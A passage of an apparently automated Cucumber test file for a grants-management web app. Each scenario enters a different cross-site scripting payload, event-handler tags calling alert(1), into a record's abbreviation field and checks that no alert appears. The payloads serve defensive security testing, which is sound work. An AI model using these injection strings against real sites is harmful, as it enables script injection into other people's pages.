      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300856 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                    | Field                |
      | <xss onpointerout=alert(1) style=display:block>XSS</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300857 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                     | Field                |
      | <xss onpointerover=alert(1) style=display:block>XSS</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300858 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                          | Field                |
      | <xss onpointerrawupdate=alert(1) style=display:block>XSS</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300859 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                   | Field                |
      | <xss onpointerup=alert(1) style=display:block>XSS</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300860 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                 | Field                |
      | <audio controls autoplay onratechange=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300861 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                     | Field                |
      | <form onreset=alert(1)><input type=reset> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300862 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                    | Field                |
      | <form><input type=search onsearch=alert(1) value="Hit return" autofocus> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300863 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                             | Field                |
      | <audio autoplay controls onseeked=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300864 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                              | Field                |
      | <audio autoplay controls onseeking=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300865 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                           | Field                |
      | <input onselect=alert(1) value="XSS" autofocus> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300866 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                             | Field                |
      | <body onselectionchange=alert(1)>select some text | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300867 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                         | Field                |
      | <body onselectstart=alert(1)>select some text | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300868 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                      | Field                |
      | <div contextmenu=xss><p>Right click<menu type=context id=xss onshow=alert(1)></menu></div> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300869 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                       | Field                |
      | <form onsubmit=alert(1)><input type=submit> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300871 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                      | Field                |
      | <body ontouchend=alert(1)> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300872 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                       | Field                |
      | <body ontouchmove=alert(1)> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300873 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                        | Field                |
      | <body ontouchstart=alert(1)> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300874 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                   | Field                |
